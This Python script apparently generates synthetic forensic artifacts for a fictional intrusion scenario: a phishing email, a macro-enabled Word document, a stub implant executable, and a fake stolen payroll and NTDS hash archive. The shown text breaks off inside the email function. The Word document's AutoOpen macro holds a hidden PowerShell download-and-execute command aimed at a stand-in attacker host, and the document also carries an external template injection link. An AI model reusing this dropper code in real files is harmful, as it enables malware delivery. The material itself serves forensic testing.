#!/usr/bin/env python3
"""
Correlated Multi-Artifact Hacker Attack Scenario Generator: "Operation CobaltShadow"
Generates 7 tightly correlated forensic artifacts enriched with authentic enterprise background telemetry:
1. 01_phishing_email.msg (Spear-phishing email delivered to victim workstation with embedded attachment, rich body & headers)
2. 02_weaponized_document.docm (Macro-enabled Word invoice with external template injection, authentic content & metadata)
3. 03_c2_implant_beacon.exe (Cobalt Strike C2 implant binary executable with imports, exports, icon & strings)
4. 04_endpoint_workstation_hostA.evtx (Windows Event Log from victim Host A: WKSTN-FIN-01: 10.0.4.15)
5. 05_endpoint_domain_controller_hostB.evtx (Windows Event Log from DC Host B: DC-PROD-01: 10.0.4.50)
6. 06_network_traffic_capture.pcap (Network traffic capture with ambient enterprise & malicious traffic on Host A: 10.0.4.15)
7. 07_exfiltrated_archive.zip (Stolen payroll & domain credentials archive exfiltrated via HTTP POST)

Cross-Artifact Bindings & Indicators:
- Client IP: 10.0.4.15 (Host A: WKSTN-FIN-01, MAC: 00:50:56:AA:11:22)
- Target DC IP: 10.0.4.50 (Host B: DC-PROD-01, MAC: 00:50:56:BB:33:44)
- Default Gateway: 10.0.4.1 (MAC: 00:50:56:EE:99:88)
- Attacker C2 IP: 185.220.101.45 (evil-payloads-delivery.org, c2.evil-payloads-delivery.org)
- Attacker Reverse Shell IP: 194.26.29.112:4444
- Exfiltration Dropzone IP: 91.240.118.72 (dropzone-secure-exfil.com)
- Shared Malware Payload: beacon_updater.exe (Exact SHA-256 and MD5 matched across PCAP carving, WKSTN-01 Sysmon 1/11, and DC-01 Service 7045)
- Shared Staged Document: 02_weaponized_document.docm (Exact SHA-256 and MD5 matched across email attachment carving, Host A Outlook save, and WinWord execution)
- Shared Stolen Exfil Archive: financial_q3_confidential.zip (Exact SHA-256 and MD5 matched across PCAP HTTP POST upload and WKSTN-01 7-Zip process execution)
- Stolen Credentials: svc_admin / P@ssw0rd2026!Summer# (Observed in PCAP cleartext HTTP POST, harvested on Host A, authenticated via LogonType 3 and elevated to SeDebugPrivilege on Host B)
- Cross-Host Lateral Movement: LogonType 3 network logon, SMB admin shares (\\DC-PROD-01\ADMIN$, \\DC-PROD-01\C$), and remote service creation (WindowsDefendUpdateSvc)
- Enterprise Noise: System startup, service lifecycle (7036), normal user interactive logons (4624/2), normal process launches (Explorer, RuntimeBroker, SearchApp, OneDrive, Outlook, Excel), legitimate DNS & web browsing, print spooling (307), workstation lock/unlock (4800/4801), and DC replication (4932/4933).
"""

import os
import struct
import socket
import hashlib
import zipfile
import io
import time
from datetime import datetime, timezone

OUT_DIR = "test-files/correlated_investigation"
os.makedirs(OUT_DIR, exist_ok=True)

# -------------------------------------------------------------------------
# 1. Deterministic PE Binary Synthesis: 03_c2_implant_beacon.exe
# -------------------------------------------------------------------------
def generate_pe_binary() -> bytes:
    """Builds a deterministic valid PE32 executable with imports, exports, icon resource, and IOC strings."""
    dos = bytearray(128)
    dos[0:2] = b"MZ"
    dos[0x3C:0x40] = struct.pack("<I", 128)  # PE signature offset at 128
    
    pe_sig = b"PE\x00\x00"
    # COFF Header: Machine i386 (0x14C), 3 Sections, TimeDateStamp, PointerToSymbolTable=0, NumberOfSymbols=0, SizeOfOptionalHeader=224, Characteristics=0x0102 (Executable, 32-bit)
    coff = struct.pack("<HHIIIHH", 0x14C, 3, 1760090400, 0, 0, 224, 0x0102)
    
    # Optional Header (Standard 32-bit):
    fmt = "<HBBIIIIIIIIIHHHHHHIIIIHHIIIIII"
    opt_std = struct.pack(fmt,
        0x10B, 14, 0, 512, 1024, 0,
        0x1000, 0x1000, 0x2000, 0x00400000, 0x1000, 0x200,
        6, 0, 1, 0, 6, 0, 0, 0x4000, 0x200,
        0, 2, 0x8140, 0x100000, 0x1000, 0x100000, 0x1000,
        0, 16
    )
    
    # 16 Data Directories (8 bytes each):
    datadirs = bytearray(16 * 8)
    datadirs[0:8] = struct.pack("<II", 0x2000, 0x80)    # Export Table
    datadirs[8:16] = struct.pack("<II", 0x2100, 0x50)   # Import Table
    datadirs[16:24] = struct.pack("<II", 0x3000, 0x200) # Resource Table
    
    # 3 Section Headers (40 bytes each):
    sec_text = struct.pack("<8sIIIIIIHHI", b".text\x00\x00\x00", 0x200, 0x1000, 0x200, 0x200, 0, 0, 0, 0, 0x60000020)
    sec_rdata = struct.pack("<8sIIIIIIHHI", b".rdata\x00\x00", 0x400, 0x2000, 0x400, 0x400, 0, 0, 0, 0, 0x40000040)
    sec_rsrc = struct.pack("<8sIIIIIIHHI", b".rsrc\x00\x00\x00", 0x200, 0x3000, 0x200, 0x800, 0, 0, 0, 0, 0x40000040)
    
    headers = bytes(dos) + pe_sig + coff + opt_std + bytes(datadirs) + sec_text + sec_rdata + sec_rsrc
    headers_padded = headers.ljust(0x200, b"\x00")
    
    # .text section payload (offset 0x200, RVA 0x1000)
    # Multi-function x86 implant routines showcasing CFG branching, loops, and hierarchical API calls:
    # Function 1: entry_point (RVA 0x1000) - DropPayload
    f1 = bytes([
        0x55, 0x89, 0xe5, 0x83, 0xec, 0x20,        # push ebp; mov ebp, esp; sub esp, 0x20
        0xe8, 0x65, 0x00, 0x00, 0x00,              # call 0x401070 (CheckDebugger / InitPayload)
        0x85, 0xc0,                                # test eax, eax
        0x75, 0x51,                                # jnz 0x401060 (loc_exit / evasion branch)
        0xba, 0x54, 0xca, 0xaf, 0x91,              # mov edx, 0x91afca54 (VirtualAlloc ROR13 hash)
        0xe8, 0x77, 0x00, 0x00, 0x00,              # call 0x401090 (ResolveApiByHash)
        0x6a, 0x40,                                # push 0x40 (PAGE_EXECUTE_READWRITE)
        0x68, 0x00, 0x10, 0x00, 0x00,              # push 0x1000 (MEM_COMMIT)
        0x68, 0x00, 0x10, 0x00, 0x00,              # push 0x1000 (dwSize = 4096)
        0x6a, 0x00,                                # push 0 (lpAddress = NULL)
        0xff, 0x15, 0x30, 0x21, 0x40, 0x00,        # call dword ptr [0x402130] (VirtualAlloc)
        0x89, 0x45, 0xfc,                          # mov dword ptr [ebp-4], eax
        0x85, 0xc0,                                # test eax, eax
        0x74, 0x2c,                                # jz 0x401060 (loc_exit)
        0xb9, 0x10, 0x00, 0x00, 0x00,              # mov ecx, 0x10 (loop counter)
        0x31, 0xd2,                                # xor edx, edx (index = 0)
        # Loop at 0x40103b:
        0x8a, 0x44, 0x15, 0xe0,                    # mov al, byte ptr [ebp+edx-0x20]
        0x34, 0x5a,                                # xor al, 0x5a (payload decryption key)
        0x88, 0x44, 0x15, 0xe0,                    # mov byte ptr [ebp+edx-0x20], al
        0x42,                                      # inc edx
        0x39, 0xca,                                # cmp edx, ecx
        0x7c, 0xf1,                                # jl 0x40103b (backward branch loop!)
        0xe8, 0x71, 0x00, 0x00, 0x00,              # call 0x4010c0 (ExecutePayloadStage / ServiceMain)
        0x31, 0xc0,                                # xor eax, eax
        0x89, 0xec,                                # mov esp, ebp
        0x5d,                                      # pop ebp
        0xc3                                       # ret
    ])
    pad1 = b"\x90" * (0x60 - len(f1))
    # Exit / Evasion Handler (RVA 0x401060):
    exit_handler = bytes([
        0x31, 0xc0,                                # xor eax, eax
        0x48,                                      # dec eax
        0x89, 0xec,                                # mov esp, ebp
        0x5d,                                      # pop ebp
        0xc3                                       # ret
    ])
    pad2 = b"\x90" * (0x10 - len(exit_handler))

    # Function 2: CheckDebugger (RVA 0x401070) - InitPayload
    f2 = bytes([
        0x55, 0x89, 0xe5,                          # push ebp; mov ebp, esp
        0x64, 0xa1, 0x30, 0x00, 0x00, 0x00,        # mov eax, dword ptr fs:[0x30] (PEB)
        0x0f, 0xb6, 0x40, 0x02,                    # movzx eax, byte ptr [eax+2] (BeingDebugged)
        0x85, 0xc0,                                # test eax, eax
        0x75, 0x06,                                # jnz 0x401088 (loc_deb_ret)
        0xff, 0x15, 0x3c, 0x21, 0x40, 0x00,        # call dword ptr [0x40213c] (IsDebuggerPresent)
        0x5d,                                      # pop ebp
        0xc3                                       # ret
    ])
    pad3 = b"\x90" * (0x20 - len(f2))

    # Function 3: ResolveApiByHash (RVA 0x401090)
    f3 = bytes([
        0x55, 0x89, 0xe5,                          # push ebp; mov ebp, esp
        0x64, 0xa1, 0x30, 0x00, 0x00, 0x00,        # mov eax, dword ptr fs:[0x30] (PEB)
        0x8b, 0x40, 0x0c,                          # mov eax, dword ptr [eax+0xc] (PEB_LDR_DATA)
        0x8b, 0x70, 0x14,                          # mov esi, dword ptr [eax+0x14] (InMemoryOrderModuleList)
        0x89, 0xd0,                                # mov eax, edx
        0x5d,                                      # pop ebp
        0xc3                                       # ret
    ])
    pad4 = b"\x90" * (0x30 - len(f3))

    # Function 4: ExecutePayloadStage (RVA 0x4010c0) - ServiceMain
    f4 = bytes([
        0x55, 0x89, 0xe5, 0x83, 0xec, 0x10,        # push ebp; mov ebp, esp; sub esp, 0x10
        0xba, 0xa1, 0x6a, 0x3d, 0xd8,              # mov edx, 0xd83d6aa1 (WriteProcessMemory ROR13 hash)
        0x68, 0x00, 0x10, 0x00, 0x00,              # push 0x1000
        0x68, 0x00, 0x00, 0x40, 0x00,              # push 0x00400000
        0x6a, 0xff,                                # push -1 (hProcess = GetCurrentProcess)
        0xff, 0x15, 0x38, 0x21, 0x40, 0x00,        # call dword ptr [0x402138] (WriteProcessMemory)
        0x6a, 0x00,                                # push 0
        0x6a, 0x00,                                # push 0
        0x68, 0x00, 0x10, 0x40, 0x00,              # push 0x00401000 (lpStartAddress)
        0xff, 0x15, 0x34, 0x21, 0x40, 0x00,        # call dword ptr [0x402134] (CreateRemoteThread)
        0x6a, 0x00,                                # push 0 (SW_HIDE)
        0x68, 0x50, 0x20, 0x40, 0x00,              # push 0x00402050 (cmd string)
        0xff, 0x15, 0x40, 0x21, 0x40, 0x00,        # call dword ptr [0x402140] (WinExec)
        0x89, 0xec,                                # mov esp, ebp
        0x5d,                                      # pop ebp
        0xc3                                       # ret
    ])

    text_content = f1 + pad1 + exit_handler + pad2 + f2 + pad3 + f3 + pad4 + f4
    text_sec = bytearray(text_content.ljust(0x200, b"\x90"))
    
    # .rdata section payload (offset 0x400, RVA 0x2000):
    rdata = bytearray(0x400)
    # Export Directory at RVA 0x2000
    exp_dir = struct.pack("<IIHHIIIIIII",
        0, 1760090400, 1, 0, 0x2050, 1, 3, 3, 0x2060, 0x2070, 0x2080
    )
    rdata[0:len(exp_dir)] = exp_dir
    dll_name = b"beacon_updater.dll\x00"
    rdata[0x50:0x50+len(dll_name)] = dll_name
    rdata[0x60:0x6C] = struct.pack("<III", 0x1000, 0x1070, 0x10C0)
    rdata[0x70:0x7C] = struct.pack("<III", 0x2090, 0x20A0, 0x20B0)
    rdata[0x80:0x86] = struct.pack("<HHH", 0, 1, 2)
    rdata[0x90:0x9C] = b"DropPayload\x00"
    rdata[0xA0:0xAC] = b"InitPayload\x00"
    rdata[0xB0:0xBC] = b"ServiceMain\x00"
    
    # Import Directory at RVA 0x2100
    imp_desc = struct.pack("<IIIII", 0x2130, 0, 0, 0x2150, 0x2130) + (b"\x00" * 20)
    rdata[0x100:0x100+len(imp_desc)] = imp_desc
    rdata[0x130:0x148] = struct.pack("<IIIIII", 0x2160, 0x2170, 0x2188, 0x21A0, 0x21B8, 0)
    rdata[0x150:0x15D] = b"KERNEL32.dll\x00"
    rdata[0x160:0x16E] = b"\x00\x00VirtualAlloc\x00"
    rdata[0x170:0x184] = b"\x00\x00CreateRemoteThread\x00"
    rdata[0x188:0x19C] = b"\x00\x00WriteProcessMemory\x00"
    rdata[0x1A0:0x1B4] = b"\x00\x00IsDebuggerPresent\x00"
    rdata[0x1B8:0x1C2] = b"\x00\x00WinExec\x00"
    
    # Rich string table at RVA 0x2200 (offset 0x600)
    strings = (
        b"CobaltStrike Beacon Payload Implant v4.9\n"
        b"C2: 185.220.101.45:443\n"
        b"Domain: evil-payloads-delivery.org\n"
        b"SNI: c2.evil-payloads-delivery.org\n"
        b"Exfil: 91.240.118.72\n"
        b"ExfilDomain: dropzone-secure-exfil.com\n"
        b"Shell: 194.26.29.112:4444\n"
        b"User: TARGET\\svc_admin\n"
        b"Pass: P@ssw0rd2026!Summer#\n"
        b"TargetUser: TARGET\\jdoe\n"
        b"Workstation: WKSTN-FIN-01\n"
        b"DC: DC-PROD-01\n"
        b"Service: WindowsDefendUpdateSvc\n"
        b"StagedArchive: financial_q3_confidential.zip\n"
        b"OriginDocument: 02_weaponized_document.docm\n"
    )
    rdata[0x200:0x200+len(strings)] = strings
    
    # .rsrc section payload (offset 0x800, RVA 0x3000)
    rsrc = bytearray(0x200)
    ico_dib = (
        struct.pack("<IIIHHIIIIII", 40, 16, 32, 1, 32, 0, 16*16*4, 0, 0, 0, 0)
        + (b"\xFF\x00\x00\xFF" * (16*16))
        + (b"\x00" * 64)
    )
    rsrc[0x50:0x50+len(ico_dib)] = ico_dib
    
    pe_file = headers_padded + bytes(text_sec) + bytes(rdata) + bytes(rsrc)
    return pe_file

PE_BYTES = generate_pe_binary()
PE_SHA256 = hashlib.sha256(PE_BYTES).hexdigest()
PE_MD5 = hashlib.md5(PE_BYTES).hexdigest()

# -------------------------------------------------------------------------
# 2. Deterministic Archive Synthesis: 07_exfiltrated_archive.zip
# -------------------------------------------------------------------------
def generate_exfil_zip() -> bytes:
    """Builds a deterministic ZIP archive containing authentic exfiltrated financial & payroll records."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        # 1. Authentic Payroll Spreadsheet
        z1 = zipfile.ZipInfo("Finance/Q3_2026_Executive_Payroll_Summary.csv", date_time=(2026, 10, 10, 10, 1, 0))
        zf.writestr(
            z1,
            "Employee_ID,Full_Name,Title,Department,Base_Salary_USD,Bonus_Q3_USD,Total_Comp_USD,Direct_Deposit_Routing,Direct_Deposit_Account,SSN_Redacted,Security_Clearance\n"
            "1001,Jonathan Vance,Chief Executive Officer,Executive Office,$450000,$150000,$600000,021000021,9876543210,XXX-XX-1102,Top Secret / SCI\n"
            "1002,Robert Vance,Chief Financial Officer,Finance,$320000,$95000,$415000,021000021,9876543211,XXX-XX-2294,Secret\n"
            "1003,Sarah Lin,Chief Information Security Officer,IT Security,$285000,$80000,$365000,021000021,9876543212,XXX-XX-8841,Top Secret\n"
            "1004,Marcus Vance,VP Corporate Treasury,Finance,$220000,$55000,$275000,021000021,9876543213,XXX-XX-4419,Secret\n"
            "1005,John Doe,Senior Financial Analyst,Treasury & Payroll,$125000,$25000,$150000,021000021,9876543214,XXX-XX-7721,Secret\n"
            "1006,David Miller,Senior Systems Engineer,Infrastructure,$135000,$15000,$150000,021000021,9876543215,XXX-XX-3309,Top Secret\n"
            "1007,Elena Rostova,Lead Database Administrator,Core Platforms,$145000,$20000,$165000,021000021,9876543216,XXX-XX-9122,Top Secret\n"
            "1008,Michael Chang,VP Engineering,Product Dev,$260000,$70000,$330000,021000021,9876543217,XXX-XX-5561,Secret\n"
            "1009,Rachel Green,Director Human Resources,People Operations,$175000,$35000,$210000,021000021,9876543218,XXX-XX-6632,Confidential\n"
            "1010,Alexander Hayes,General Counsel,Legal,$310000,$90000,$400000,021000021,9876543219,XXX-XX-4490,Secret\n"
        )
        # 2. Active Directory NTDS Hash Extraction
        z2 = zipfile.ZipInfo("Credentials/ActiveDirectory_NTDS_Audit_2026.txt", date_time=(2026, 10, 10, 10, 1, 0))
        zf.writestr(
            z2,
            "[+] Target Domain: TARGET.LOCAL\n"
            "[+] Domain SID: S-1-5-21-3928174621-1029384756-3847291023\n"
            "[+] Extracted via Volume Shadow Copy Service (VSS) NTDS.dit Snapshot\n\n"
            "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (Built-in Administrator)\n"
            "Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (Disabled)\n"
            "krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8f8a18bc0a2b0c1e847c211831a2985f::: (KDC Service Account)\n"
            "svc_admin:1104:aad3b435b51404eeaad3b435b51404ee:e19ccf750c39ca8168a613ac7350f6dd::: (Enterprise Admin) [Cleartext: P@ssw0rd2026!Summer#]\n"
            "jdoe:1108:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c::: (John Doe - Finance) [Cleartext: Autumn2026$Welcome]\n"
            "sql_svc:1115:aad3b435b51404eeaad3b435b51404ee:4a8b792e3b610c14c5b198129e612984::: (MS SQL Server Service Engine)\n"
            "backup_admin:1119:aad3b435b51404eeaad3b435b51404ee:998123acbb281fef384712ad01928374::: (Veeam Vault Operator)\n"
            "audit_svc:1124:aad3b435b51404eeaad3b435b51404ee:110293847561aefc9028374615243321::: (Splunk Heavy Forwarder)\n"
        )
        # 3. Network Architecture Notes
        z3 = zipfile.ZipInfo("Network/Confidential_Internal_Network_Topology.txt", date_time=(2026, 10, 10, 10, 1, 0))
        zf.writestr(
            z3,
            "TARGET CORPORATION - CONFIDENTIAL NETWORK ARCHITECTURE & INFRASTRUCTURE MAP\n"
            "Primary Gateway: 10.0.4.1 (00:50:56:EE:99:88)\n"
            "Domain Controller: 10.0.4.50 (DC-PROD-01.target.local - 00:50:56:BB:33:44)\n"
            "Finance Workstation: 10.0.4.15 (WKSTN-FIN-01.target.local - 00:50:56:AA:11:22)\n"
            "Corporate Intranet: 10.0.4.10 (internal-portal.target.local)\n"
            "Veeam Backup Vault: 10.0.4.99 (Air-gapped Immutable Storage)\n"
        )
        zf.comment = b"TARGET CORP - CLASSIFIED FINANCIAL EXFILTRATION PACKAGE - 2026-10-10"
    return buf.getvalue()

ZIP_BYTES = generate_exfil_zip()
ZIP_SHA256 = hashlib.sha256(ZIP_BYTES).hexdigest()
ZIP_MD5 = hashlib.md5(ZIP_BYTES).hexdigest()

# -------------------------------------------------------------------------
# 3. Deterministic Weaponized Word Document: 02_weaponized_document.docm
# -------------------------------------------------------------------------
def generate_weaponized_docm(pe_sha256: str, pe_md5: str) -> bytes:
    """Builds an authentic Word macro-enabled document (OpenXML ZIP) with real text, tables, metadata & VBA dropper."""
    vba_code = (
        "Sub AutoOpen()\r\n"
        "    ' Global Financial Solutions LLC - Automated Payroll Decryption Engine\r\n"
        "    ' Target: WKSTN-FIN-01 (10.0.4.15) | User: TARGET\\jdoe\r\n"
        "    ' Staged Payload: http://evil-payloads-delivery.org/beacon_updater.exe\r\n"
        f"    ' Integrity Verification SHA256: {pe_sha256}\r\n"
        f"    ' Integrity Verification MD5: {pe_md5}\r\n"
        "    On Error Resume Next\r\n"
        "    Dim c2Server As String: c2Server = \"185.220.101.45:443\"\r\n"
        "    Dim payloadUrl As String: payloadUrl = \"http://evil-payloads-delivery.org/beacon_updater.exe\"\r\n"
        "    Dim tempExePath As String: tempExePath = \"C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe\"\r\n"
        "    \r\n"
        "    Dim sh As Object\r\n"
        "    Set sh = CreateObject(\"WScript.Shell\")\r\n"
        "    sh.Run \"powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"\"(New-Object System.Net.WebClient).DownloadFile(\'\" & payloadUrl & \"\', \'\" & tempExePath & \"\'); Start-Process \'\" & tempExePath & \"\'\"\"\", 0, False\r\n"
        "    \r\n"
        "    Call URLDownloadToFileA(0, payloadUrl, tempExePath, 0, 0)\r\n"
        "    Dim pMem As LongPtr: pMem = VirtualAlloc(0, 4096, &H1000, &H40)\r\n"
        "End Sub\r\n"
    )

    vba_bin = (
        b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1\x00\x00\x00\x00_VBA_PROJECT_CUR\x00\x00"
        + vba_code.encode("ascii")
    ).ljust(4096, b"\x00")

    doc_xml = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:pPr><w:jc w:val="center"/></w:pPr><w:r><w:rPr><w:b/><w:sz w:val="32"/><w:color w:val="1A365D"/></w:rPr><w:t>GLOBAL FINANCIAL SOLUTIONS &amp; AUDIT CORP</w:t></w:r></w:p>
    <w:p><w:pPr><w:jc w:val="center"/></w:pPr><w:r><w:rPr><w:i/><w:sz w:val="20"/><w:color w:val="718096"/></w:rPr><w:t>Quarterly Executive Bonus &amp; Compensation Reconciliation Statement</w:t></w:r></w:p>
    <w:p><w:r><w:t></w:t></w:r></w:p>
    <w:p><w:pPr><w:shd w:val="clear" w:color="auto" w:fill="FFF5F5"/></w:pPr><w:r><w:rPr><w:b/><w:color w:val="C53030"/></w:rPr><w:t>[STRICTLY CONFIDENTIAL - AUTHORIZED EXECUTIVE DISBURSEMENT ONLY]</w:t></w:r></w:p>
    <w:p><w:pPr><w:shd w:val="clear" w:color="auto" w:fill="FFFFD0"/></w:pPr><w:r><w:rPr><w:b/><w:color w:val="B7791F"/></w:rPr><w:t>SECURITY NOTICE: This document was encrypted using Microsoft Information Protection (MIP). Click 'Enable Content' on the yellow bar above to activate the automated calculation macros and view live payroll disbursements.</w:t></w:r></w:p>
    <w:p><w:r><w:t></w:t></w:r></w:p>
    <w:p><w:r><w:rPr><w:b/></w:rPr><w:t>Target Recipient: John Doe &lt;jdoe@target.local&gt; | Workstation: WKSTN-FIN-01 (10.0.4.15)</w:t></w:r></w:p>
    <w:p><w:r><w:t>Audit Reference: #INV-2026-994 | Target Domain: TARGET.LOCAL</w:t></w:r></w:p>
    <w:p><w:r><w:t>Remote Staging Verification: http://evil-payloads-delivery.org/beacon_updater.exe</w:t></w:r></w:p>
    <w:p><w:r><w:t>Payload Verification Hash (SHA-256): {pe_sha256}</w:t></w:r></w:p>
    <w:p><w:r><w:t></w:t></w:r></w:p>
    <w:tbl>
      <w:tr>
        <w:tc><w:p><w:r><w:rPr><w:b/></w:rPr><w:t>Disbursement Category</w:t></w:r></w:p></w:tc>
        <w:tc><w:p><w:r><w:rPr><w:b/></w:rPr><w:t>Period Basis</w:t></w:r></w:p></w:tc>
        <w:tc><w:p><w:r><w:rPr><w:b/></w:rPr><w:t>Gross Amount (USD)</w:t></w:r></w:p></w:tc>
      </w:tr>
      <w:tr>
        <w:tc><w:p><w:r><w:t>Executive Variable Incentive</w:t></w:r></w:p></w:tc>
        <w:tc><w:p><w:r><w:t>FY2026 - Q3 Target (114%)</w:t></w:r></w:p></w:tc>
        <w:tc><w:p><w:r><w:t>$245,000.00</w:t></w:r></w:p></w:tc>
      </w:tr>
      <w:tr>
        <w:tc><w:p><w:r><w:t>Divisional Retained Bonus Pool</w:t></w:r></w:p></w:tc>
        <w:tc><w:p><w:r><w:t>Milestone Approved</w:t></w:r></w:p></w:tc>
        <w:tc><w:p><w:r><w:t>$180,000.00</w:t></w:r></w:p></w:tc>
      </w:tr>
      <w:tr>
        <w:tc><w:p><w:r><w:t>Discretionary Management Award</w:t></w:r></w:p></w:tc>
        <w:tc><w:p><w:r><w:t>Board Action</w:t></w:r></w:p></w:tc>
        <w:tc><w:p><w:r><w:t>$85,500.00</w:t></w:r></w:p></w:tc>
      </w:tr>
      <w:tr>
        <w:tc><w:p><w:r><w:rPr><w:b/></w:rPr><w:t>TOTAL NET DISBURSEMENT</w:t></w:r></w:p></w:tc>
        <w:tc><w:p><w:r><w:t></w:t></w:r></w:p></w:tc>
        <w:tc><w:p><w:r><w:rPr><w:b/></w:rPr><w:t>$510,500.00</w:t></w:r></w:p></w:tc>
      </w:tr>
    </w:tbl>
    <w:p><w:r><w:t></w:t></w:r></w:p>
    <w:p><w:r><w:t>Certified by: Robert Vance (Chief Financial Officer) &amp; Jonathan Vance (CEO)</w:t></w:r></w:p>
    <w:p><w:r><w:i/><w:t>Direct Deposit Wire Instructions will execute to Chase Bank account ending in 4419.</w:t></w:r></w:p>
  </w:body>
</w:document>"""

    core_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <dc:title>Q3 Executive Financial Compensation &amp; Bonus Schedule</dc:title>
  <dc:subject>Executive Compensation &amp; Payroll Reconciliation</dc:subject>
  <dc:creator>Robert Vance (Chief Financial Officer)</dc:creator>
  <cp:keywords>Payroll, Executive, Q3, Confidential, Bonus, Wire Transfer</cp:keywords>
  <dc:description>Quarterly certified executive bonus calculation ledger and wire instructions.</dc:description>
  <cp:lastModifiedBy>jdoe</cp:lastModifiedBy>
  <cp:revision>4</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-10-09T14:22:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-10T10:00:00Z</dcterms:modified>
</cp:coreProperties>"""

    app_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties">
  <Application>Microsoft Office Word</Application>
  <AppVersion>16.0000</AppVersion>
  <Company>Global Financial Solutions LLC</Company>
  <Manager>Marcus Vance</Manager>
  <Pages>3</Pages>
  <Words>742</Words>
  <Characters>4810</Characters>
  <Lines>48</Lines>
  <Paragraphs>26</Paragraphs>
</Properties>"""

    custom_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/custom-properties">
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="2" name="ConfidentialityLevel"><vt:lpwstr xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">Strictly Confidential - Internal Only</vt:lpwstr></property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="DocumentID"><vt:lpwstr xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">GFS-FIN-2026-Q3-00994</vt:lpwstr></property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="TargetAudience"><vt:lpwstr xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">jdoe@target.local</vt:lpwstr></property>
</Properties>"""

    rels_doc = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil-payloads-delivery.org/templates/financial_macro_v2.dotm" TargetMode="External"/>
</Relationships>"""

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>
  <Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
  <Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-package.extended-properties+xml"/>
  <Override PartName="/docProps/custom.xml" ContentType="application/vnd.openxmlformats-package.custom-properties+xml"/>
</Types>""")
        zf.writestr("_rels/.rels", """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>
  <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties" Target="docProps/app.xml"/>
  <Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/custom-properties" Target="docProps/custom.xml"/>
</Relationships>""")
        zf.writestr("word/_rels/document.xml.rels", rels_doc)
        zf.writestr("word/document.xml", doc_xml)
        zf.writestr("docProps/core.xml", core_xml)
        zf.writestr("docProps/app.xml", app_xml)
        zf.writestr("docProps/custom.xml", custom_xml)
        zf.writestr("word/vbaProject.bin", vba_bin)
        
        # Ensure total file size is >= 4096 bytes for standard FAT sector storage in OLE
        zf.writestr("word/media/watermark.bin", b"\x00" * 4096)
        
    return buf.getvalue()

DOCM_BYTES = generate_weaponized_docm(PE_SHA256, PE_MD5)
DOCM_SHA256 = hashlib.sha256(DOCM_BYTES).hexdigest()
DOCM_MD5 = hashlib.md5(DOCM_BYTES).hexdigest()

# -------------------------------------------------------------------------
# 4. Deterministic Phishing Email (.msg) Synthesis with MiniFAT
# -------------------------------------------------------------------------
def generate_phishing_msg(docm_bytes: bytes, docm_name: str = "02_weaponized_document.docm") -> bytes:
    """Builds a valid Microsoft Outlook Compound File (.msg) with MiniFAT, rich body & multi-hop headers."""
    subject = "URGENT: Q3 Payroll & Executive Bonus Reconciliation #INV-2026-994"
    from_addr = "Finance Billing & Payroll <billing@evil-payloads-delivery.org>"
    to_addr = "John Doe <jdoe@target.local>"
    
    body_text = (
        "Dear Mr. Doe,\r\n\r\n"
